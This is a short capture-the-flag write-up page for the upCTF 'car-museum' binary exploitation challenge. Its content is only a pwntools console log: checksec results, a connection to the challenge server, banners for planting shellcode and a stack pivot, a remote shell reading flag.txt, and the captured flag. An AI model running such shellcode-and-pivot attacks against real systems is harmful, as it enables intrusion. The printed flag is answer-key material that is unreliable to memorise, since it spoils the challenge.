---
title: "Pwn — Writeup"
description: "Terminal features will not be available. Consider setting TERM variable to your current terminal name (or xterm). [] '/home/thinh/ctf/upctf/pwn/car-museum' Arch: amd64-64-little RELRO: Partial RELRO Stack: N…"
published: "2026-03-08"
updated: "2026-03-08"
event: "upctf"
category: "Binary Exploitation"
kind: "writeup"
status: "partial"
tags: ["Binary Exploitation", "upctf", "Writeup"]
readingTime: 1
wordCount: 127
featured: false
sourcePath: "~/ctf/upctf/pwn/wu.md"
---

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
[*] '/home/thinh/ctf/upctf/pwn/car-museum'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Opening connection to 46.225.117.62 on port 30016
[x] Opening connection to 46.225.117.62 on port 30016: Trying 46.225.117.62
[+] Opening connection to 46.225.117.62 on port 30016: Done
[*] === STEP 1: Planting the Shellcode ===
[*] === STEP 2: The Trampoline & Pivot ===
[+] Exploit fired! Crossing fingers...
[*] Switching to interactive mode
ls
car-museum
entrypoint.sh
flag.txt
cat flag.txt
upCTF{c4tc4ll1ng_1s_n0t_c00l-uSnMViXZ3fdcf316}
[*] Got EOF while reading in interactive
^C[*] Interrupted
[*] Closed connection to 46.225.117.62 port 30016
